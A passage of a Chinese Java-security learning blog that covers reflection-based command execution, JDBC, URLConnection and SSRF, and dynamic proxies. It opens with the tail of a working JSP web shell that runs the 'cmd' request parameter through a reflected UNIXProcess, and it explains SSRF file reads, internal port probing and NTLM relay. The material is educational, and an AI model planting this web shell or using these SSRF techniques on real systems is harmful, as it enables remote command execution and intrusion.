class="type">int</span>[] std_fds = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileInputStream</span>  <span class="variable">f0</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// In theory, close() can throw IOException</span></span><br><span class="line">        <span class="comment">// (although it is rather unlikely to happen here)</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (f0 != <span class="literal">null</span>) f0.close();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (f1 != <span class="literal">null</span>) f1.close();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (f2 != <span class="literal">null</span>) f2.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建UNIXProcess或者ProcessImpl实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(</span><br><span class="line">                toCString(strs[<span class="number">0</span>]), argBlock, args.length,</span><br><span class="line">                <span class="literal">null</span>, envc[<span class="number">0</span>], <span class="literal">null</span>, std_fds, <span class="literal">false</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取命令执行的InputStream</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">inMethod</span> <span class="operator">=</span> object.getClass().getDeclaredMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">        inMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (InputStream) inMethod.invoke(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">inputStreamToString</span><span class="params">(InputStream in, String charset)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (charset == <span class="literal">null</span>) &#123;</span><br><span class="line">                charset = <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">int</span>                   <span class="variable">a</span>   <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">byte</span>[]                b   = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(out.toByteArray());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (in != <span class="literal">null</span>)</span><br><span class="line">                in.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String[] str = request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span>     <span class="operator">=</span> start(str);</span><br><span class="line">        <span class="type">String</span>      <span class="variable">result</span> <span class="operator">=</span> inputStreamToString(in, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        out.println(result);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>



<h2 id="JDBC基础（暂时跳过）"><a href="#JDBC基础（暂时跳过）" class="headerlink" title="JDBC基础（暂时跳过）"></a>JDBC基础（暂时跳过）</h2><p><code>JDBC(Java Database Connectivity)</code>是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的API接口(<code>JDBC</code>)，不同的数据库提供商必须实现JDBC定义的接口从而也就实现了对数据库的一系列操作。</p>
<h3 id="JDBC-Connection"><a href="#JDBC-Connection" class="headerlink" title="JDBC Connection"></a>JDBC Connection</h3><p>Java通过<code>java.sql.DriverManager</code>来管理所有数据库的驱动注册，所以如果想要建立数据库连接需要先在<code>java.sql.DriverManager</code>中注册对应的驱动类，然后调用<code>getConnection</code>方法才能连接上数据库。</p>
<p>JDBC定义了一个叫<code>java.sql.Driver</code>的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。<code>java.sql.DriverManager.getConnection(xx)</code>其实就是间接的调用了<code>java.sql.Driver</code>类的<code>connect</code>方法实现数据库连接的。数据库连接成功后会返回一个叫做<code>java.sql.Connection</code>的数据库连接对象，一切对数据库的查询操作都将依赖于这个<code>Connection</code>对象。</p>
<p>JDBC连接数据库的一般步骤:</p>
<ol>
<li>注册驱动，<code>Class.forName(&quot;数据库驱动的类名&quot;)</code>。</li>
<li>获取连接，<code>DriverManager.getConnection(xxx)</code>。</li>
</ol>
<p><strong>JDBC连接数据库示例代码如下:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mysql&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">USERNAME</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line">Class.forName(CLASS_NAME);<span class="comment">// 注册JDBC驱动类</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br></pre></td></tr></table></figure>

<h4 id="数据库配置信息"><a href="#数据库配置信息" class="headerlink" title="数据库配置信息"></a>数据库配置信息</h4><h2 id="URLConnection"><a href="#URLConnection" class="headerlink" title="URLConnection"></a>URLConnection</h2><p>在java中，Java抽象出来了一个<code>URLConnection</code>类，它用来表示应用程序以及与URL建立通信连接的所有类的超类，通过<code>URL</code>类中的<code>openConnection</code>方法获取到<code>URLConnection</code>的类对象。</p>
<p>Java中URLConnection支持的协议可以在<code>sun.net.www.protocol</code>看到。</p>
<img src="/image/image-20230710163309746.png" alt="image-20230710163309746" style="zoom:80%;" />

<p>由上图可以看到，支持的协议有以下几个(当前jdk版本:1.7.0_80):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file ftp mailto http https jar netdoc gopher</span><br></pre></td></tr></table></figure>

<p>虽然看到有<code>gopher</code>，但是<code>gopher</code>实际在jdk8版本以后被阉割了，jdk7高版本虽然存在，但是需要设置</p>
<p>其中每个协议都有一个<code>Handle</code>,<code>Handle</code>定义了这个协议如何去打开一个连接。</p>
<p>我们来使用URL发起一个简单的请求</p>
<h3 id="TestURLConnection"><a href="#TestURLConnection" class="headerlink" title="TestURLConnection"></a>TestURLConnection</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.url;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLConnection</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//定义URL链接</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://blog.ysneko.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打开url连接</span></span><br><span class="line">        <span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> url.openConnection();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置请求参数</span></span><br><span class="line">        urlConnection.setRequestProperty(<span class="string">&quot;user-agent&quot;</span>, <span class="string">&quot;Y5neKO_Browser&quot;</span>);</span><br><span class="line">        <span class="comment">//urlConnection.setConnectTimeout(1000);</span></span><br><span class="line">        <span class="comment">//urlConnection.setReadTimeout(1000);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//建立实际连接</span></span><br><span class="line">        urlConnection.connect();</span><br><span class="line">        <span class="comment">//获取响应字段</span></span><br><span class="line">        urlConnection.getHeaderFields();</span><br><span class="line">        <span class="comment">//通过getInputStream方法获取URL输入流</span></span><br><span class="line">        urlConnection.getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建StringBuilder对象接收输入流获取的内容</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="comment">//创建BufferedReader对象和InputStreamReader对象用来逐步处理URL输入流</span></span><br><span class="line">        <span class="comment">//BufferedReader是阻塞流，需要readLine方法取走才会继续读取</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(urlConnection.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//逐行读取BufferedReader对象接收的内容到line中</span></span><br><span class="line">        <span class="keyword">while</span> ((line = in.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            content.append(<span class="string">&quot;\n&quot;</span>).append(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230710171051318.png" alt="image-20230710171051318" style="zoom:80%;" />

<p>大概描述一下这个过程，首先使用URL建立一个对象，调用<code>url</code>对象中的<code>openConnection</code>来获取一个<code>URLConnection</code>的实例，然后通过在<code>URLConnection</code>设置各种请求参数以及一些配置，在使用其中的<code>connect</code>方法来发起请求，然后在调用<code>getInputStream</code>来获请求的响应流。 这是一个基本的请求到响应的过程。</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>我们之前提到，由于URL类支持7种协议，因此在传入参数可控且没有做限制的情况下，很容易引发SSRF漏洞</p>
<p>例如，传入url参数为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///D:/test.txt&quot;</span>);</span><br><span class="line"><span class="type">URLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> url.openConnection();</span><br><span class="line">connection.connect();</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230710171518318.png" alt="image-20230710171518318" style="zoom:80%;" />

<p>但是如果上述代码中将<code>url.openConnection()</code>返回的对象强转为<code>HttpURLConnection</code>，则会抛出如下异常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.ClassCastException: sun.net.www.protocol.file.FileURLConnection cannot be cast to java.net.HttpURLConnection</span><br></pre></td></tr></table></figure>

<p>由此看来，ssrf漏洞也对使用不同类发起的url请求也是有所区别的，如果是<code>URLConnection|URL</code>发起的请求，那么对于上文中所提到的所有<code>protocol</code>都支持，但是如果经过二次包装或者其他的一些类发出的请求，比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HttpURLConnection</span><br><span class="line">HttpClient</span><br><span class="line">Request</span><br><span class="line">okhttp</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>那么只支持发起<code>http|https</code>协议，否则会抛出异常。</p>
<p>如果传入的是<code>http://127.0.0.1:80</code>，且<code>127.0.0.1</code>的<code>80</code>端口存在的，则会将其网页源码输出出来</p>
<p><img src="/image/image-20230710171851532.png" alt="image-20230710171851532"></p>
<p>但如果是非web端口的服务，则会爆出<code>Invalid Http response</code> 或<code>Connection reset</code>异常。如果能将此异常抛出来，那么就可以对内网所有服务端口进行探测。</p>
<p>java中默认对(http|https)做了一些事情，比如:</p>
<ul>
<li>默认启用了透明NTLM认证</li>
<li>默认跟随跳转</li>
</ul>
<p>关于NTLM认证的过程这边不在复述，大家可以看该文章<a href="https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/">《Ghidra 从 XXE 到 RCE》</a> 默认跟随跳转这其中有一个坑点，就是</p>
<p><img src="/image/follow_redirect.jpg" alt="img"></p>
<p>它会对跟随跳转的url进行协议判断，所以Java的SSRF漏洞利用方式整体比较有限。</p>
<ul>
<li>利用file协议读取文件内容（仅限使用<code>URLConnection|URL</code>发起的请求）</li>
<li>利用http 进行内网web服务端口探测</li>
<li>利用http 进行内网非web服务端口探测(如果将异常抛出来的情况下)</li>
<li>利用http进行ntlmrelay攻击(仅限<code>HttpURLConnection</code>或者二次包装<code>HttpURLConnection</code>并未复写<code>AuthenticationInfo</code>方法的对象)</li>
</ul>
<p>对于防御ssrf漏洞的攻击，不单单要对传入的协议进行判断过滤，也要对其中访问的地址进行限制过滤。</p>
<h2 id="JNI安全基础（暂时跳过）"><a href="#JNI安全基础（暂时跳过）" class="headerlink" title="JNI安全基础（暂时跳过）"></a>JNI安全基础（暂时跳过）</h2><h2 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h2><p><code>Java</code>反射提供了一种类动态代理机制，可以通过代理接口实现类来完成程序无侵入式扩展。</p>
<p><strong>Java动态代理主要使用场景：</strong></p>
<ol>
<li>统计方法执行所耗时间。</li>
<li>在方法执行前后添加日志。</li>
<li>检测方法的参数或返回值。</li>
<li>方法访问权限控制。</li>
<li>方法<code>Mock</code>测试。</li>
</ol>
<h3 id="动态代理API"><a href="#动态代理API" class="headerlink" title="动态代理API"></a>动态代理API</h3><p>创建动态代理类会使用到<code>java.lang.reflect.Proxy</code>类和<code>java.lang.reflect.InvocationHandler</code>接口。<code>java.lang.reflect.Proxy</code>主要用于生成动态代理类<code>Class</code>、创建代理类实例，该类实现了<code>java.io.Serializable</code>接口。</p>
<p><strong>java.lang.reflect.Proxy类主要有下面几种方法：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取动态代理处理类对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy 返回调用处理程序的代理实例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 代理实例的调用处理程序</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException 如果参数不是一个代理实例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title function_">getInvocationHandler</span><span class="params">(Object proxy)</span></span><br><span class="line">            <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建动态代理类实例</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader     指定动态代理类的类加载器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> h          动态代理处理类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回动态代理生成的代理类实例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span><br><span class="line">            <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建动态代理类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader     定义代理类的类加载器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces 代理类要实现的接口列表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 用指定的类加载器定义的代理类，它可以实现指定的接口</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检测某个类是否是动态代理类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cl 要测试的类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如该类为代理类，则为 true，否则为 false</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isProxyClass</span><span class="params">(Class&lt;?&gt; cl)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 向指定的类加载器中定义一个类对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader 类加载器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name   类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> b      类字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> off    截取开始位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> len    截取长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> JVM创建的类Class对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> Class <span class="title function_">defineClass0</span><span class="params">(ClassLoader loader, String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>java.lang.reflect.InvocationHandler</code>接口用于调用<code>Proxy</code>类生成的代理类方法，该类只有一个<code>invoke</code>方法。</p>
<img src="/image/image-20230714003929831.png" alt="image-20230714003929831" style="zoom:80%;" />

<img src="/image/image-20230714004034736.png" alt="image-20230714004034736" style="zoom:80%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 每个代理实例都具有一个关联的调用处理程序。对代理实例调用方法时，将对方法调用进行编码并</span></span><br><span class="line"><span class="comment"> * 将其指派到它的调用处理程序的 invoke 方法。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在代理实例上处理方法调用并返回结果。在与方法关联的代理实例上调用方法时，将在调用处理程序上调用此方法。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy  在其上调用方法的代理实例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method 对应于在代理实例上调用的接口方法的 Method 实例。Method 对象的声明类将是在其中声明</span></span><br><span class="line"><span class="comment">     *               方法的接口，该接口可以是代理类赖以继承方法的代理接口的超接口。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args   包含传入代理实例上方法调用的参数值的对象数组，如果接口方法不使用参数，</span></span><br><span class="line"><span class="comment">     *               则为 null。基本类型的参数被包装在适当基本包装器类（如 java.lang.Integer</span></span><br><span class="line"><span class="comment">     *               或 java.lang.Boolean）的实例中。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 从代理实例的方法调用返回的值。如果接口方法的声明返回类型是基本类型，</span></span><br><span class="line"><span class="comment">     * 则此方法返回的值一定是相应基本包装对象类的实例；否则，它一定是可分配到声明返回类型的类型。</span></span><br><span class="line"><span class="comment">     * 如果此方法返回的值为 null 并且接口方法的返回类型是基本类型，则代理实例上的方法调用将抛出</span></span><br><span class="line"><span class="comment">     * NullPointerException。否则，如果此方法返回的值与上述接口方法的声明返回类型不兼容，</span></span><br><span class="line"><span class="comment">     * 则代理实例上的方法调用将抛出 ClassCastException。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable 从代理实例上的方法调用抛出的异常。该异常的类型必须可以分配到在接口方法的</span></span><br><span class="line"><span class="comment">     *                   throws 子句中声明的任一异常类型或未经检查的异常类型 java.lang.RuntimeException 或</span></span><br><span class="line"><span class="comment">     *                   java.lang.Error。如果此方法抛出经过检查的异常，该异常不可分配到在接口方法的 throws 子句中</span></span><br><span class="line"><span class="comment">     *                   声明的任一异常类型，代理实例的方法调用将抛出包含此方法曾抛出的异常的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用java-lang-reflect-Proxy动态创建类对象"><a href="#使用java-lang-reflect-Proxy动态创建类对象" class="headerlink" title="使用java.lang.reflect.Proxy动态创建类对象"></a>使用java.lang.reflect.Proxy动态创建类对象</h3><p><code>ClassLoader</code>和<code>Unsafe</code>都有一个叫做<code>defineClassXXX</code>的<code>native</code>方法，我们可以通过调用这个<code>native</code>方法动态的向<code>JVM</code>创建一个类对象，而<code>java.lang.reflect.Proxy</code>类恰好也有这么一个<code>native</code>方法，所以我们也将可以通过调用<code>java.lang.reflect.Proxy</code>类<code>defineClass0</code>方法实现动态创建类对象。</p>
<h4 id="ProxyDefineClassTest"><a href="#ProxyDefineClassTest" class="headerlink" title="ProxyDefineClassTest"></a>ProxyDefineClassTest</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.y5neko.sec.classloader.TestClassLoader.TEST_CLASS_BYTES;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.y5neko.sec.classloader.TestClassLoader.TEST_CLASS_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyDefineClassTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.reflect.Proxy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取系统的类加载器，可以根据具体情况换成一个存在的类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射java.lang.reflect.Proxy类获取其中的defineClass0方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;defineClass0&quot;</span>, ClassLoader.class, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射调用java.lang.reflect.Proxy.defineClass0()方法，动态向JVM注册</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">helloWorldClass</span> <span class="operator">=</span> (Class) method.invoke(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;classLoader, TEST_CLASS_NAME, TEST_CLASS_BYTES, <span class="number">0</span>, TEST_CLASS_BYTES.length&#125;);</span><br><span class="line">        System.out.println(helloWorldClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230714104037059.png" alt="image-20230714104037059" style="zoom:80%;" />

<h3 id="创建代理类实例"><a href="#创建代理类实例" class="headerlink" title="创建代理类实例"></a>创建代理类实例</h3><p>我们可以使用<code>Proxy.newProxyInstance</code>来创建动态代理类实例，或者使用<code>Proxy.getProxyClass()</code>获取代理类对象再反射的方式来创建，下面我们以<code>com.y5neko.sec.proxy.FileSystem</code>接口为例，演示如何创建其动态代理类实例。</p>
<h4 id="com-y5neko-sec-proxy-FileSystem"><a href="#com-y5neko-sec-proxy-FileSystem" class="headerlink" title="com.y5neko.sec.proxy.FileSystem"></a>com.y5neko.sec.proxy.FileSystem</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">FileSystem</span> <span class="keyword">extends</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    String[] list(File file);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

